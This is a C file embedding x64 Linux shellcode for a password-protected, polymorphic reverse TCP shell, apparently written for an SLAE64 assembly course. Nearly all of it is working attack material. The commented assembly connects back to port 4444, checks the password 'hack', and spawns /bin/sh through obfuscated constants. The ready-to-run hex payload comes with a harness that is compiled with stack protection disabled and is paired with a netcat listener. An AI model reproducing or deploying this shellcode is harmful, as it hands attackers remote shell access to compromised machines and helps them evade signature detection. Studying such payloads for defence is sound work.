/*---------------------------------------------------------------------------------------------------------------------
/*
*Title:            tcp reverse shell with password polymorphic version v2 135 bytes
*Author:           Sathish kumar
*Contact:          https://www.linkedin.com/in/sathish94
*Copyright:        (c) 2016 iQube. (http://iQube.io)
*Release Date:     January 29, 2016
*Description:      x64 Linux reverse TCP port shellcode on port 4444 with reconfigurable password
*Tested On:        Ubuntu 14.04 LTS
*SLAE64-1408
*Build/Run:        gcc -fno-stack-protector -z execstack filename.c -o filename
*                   ./bindshell
*                   nc -l 4444 -vvv
*

global _start

_start:

    xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi
	mul rsi
	push byte 0x2   ;pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall

	; copying the socket descripter from rax to rdi register so that we can use it further

	xchg rax, rdi

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure

	xor rax, rax
	push rax                         ; bzero(&server.sin_zero, 8)
	mov ebx , 0xfeffff80             ; ip address 127.0.0.1 "noted" to remove null
	not ebx
	mov dword [rsp-4], ebx
	sub rsp , 4                      ; adjust the stack
	xor r9, r9
	push word 0x5c11                 ; port 4444 in network byte order
	push word 0x02                   ; AF_INET
	push rsp
	pop rsi


	push 0x10
	pop rdx
	push 0x2a
	pop rax
	syscall

	push 0x3
	pop rsi								; setting argument to 3



duplicate:
    dec esi
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate

password_check:

	push rsp
	pop rsi
	xor rax, rax   ; system read syscall value is 0 so rax is set to 0
	syscall
	push 0x6b636168 ; password to connect to shell is hack which is pushed in reverse and hex encoded
	pop rax
	lea rdi, [rel rsi]
	scasd           ; comparing the user input and stored password in the stack


execve:
    xor esi, esi
    xor r15, r15
    mov r15w, 0x161f
    sub r15w, 0x1110
    push r15
    mov r15, rsp
    mov rdi, 0xff978cd091969dd0
    inc rdi
    neg rdi
    mul esi
    add al, 0x3b
    push rdi
    push rsp
    pop rdi
    call r15


*/
#include <stdio.h>
#include <string.h>

unsigned char code[] =\
"\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x48\x31\xc0\x50\xbb\x80\xff\xff\xfe\xf7\xd3\x89\x5c\x24\xfc\x48\x83\xec\x04\x4d\x31\xc9\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x54\x5e\x48\x31\xc0\x0f\x05\x68\x68\x61\x63\x6b\x58\x48\x8d\x3e\xaf\x31\xf6\x4d\x31\xff\x66\x41\xbf\x1f\x16\x66\x41\x81\xef\x10\x11\x41\x57\x49\x89\xe7\x48\xbf\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xff\xc7\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x41\xff\xd7";

main()
{
   printf("Shellcode Length: %d\n", (int)strlen(code));
   int (*ret)() = (int(*)())code;
   ret();
}